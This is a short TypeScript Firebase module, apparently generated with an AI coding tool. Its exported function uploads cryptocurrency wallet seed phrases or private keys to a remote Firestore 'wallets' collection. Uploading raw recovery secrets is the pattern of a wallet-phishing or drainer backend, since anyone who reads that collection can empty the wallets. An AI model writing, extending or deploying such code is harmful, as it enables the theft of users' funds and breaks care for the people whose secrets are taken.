import { initializeApp } from "firebase/app"
import { getFirestore, collection, addDoc } from "firebase/firestore"

// Firebase configuration - user needs to replace with their own config
const firebaseConfig = {
  apiKey: process.env.NEXT_PUBLIC_FIREBASE_API_KEY,
  authDomain: process.env.NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN,
  projectId: process.env.NEXT_PUBLIC_FIREBASE_PROJECT_ID,
  storageBucket: process.env.NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: process.env.NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID,
  appId: process.env.NEXT_PUBLIC_FIREBASE_APP_ID,
}

// Initialize Firebase
const app = initializeApp(firebaseConfig)
export const db = getFirestore(app)

// Function to save wallet data to Firestore
export const saveWalletToFirestore = async (walletData: {
  type: "seed" | "private"
  data: string[] | string
  passwordHash: string
  timestamp: number
}) => {
  try {
    const docRef = await addDoc(collection(db, "wallets"), walletData)
    console.log("[v0] Wallet saved to Firestore with ID: ", docRef.id)
    return docRef.id
  } catch (error) {
    console.error("[v0] Error saving wallet to Firestore: ", error)
    throw error
  }
}
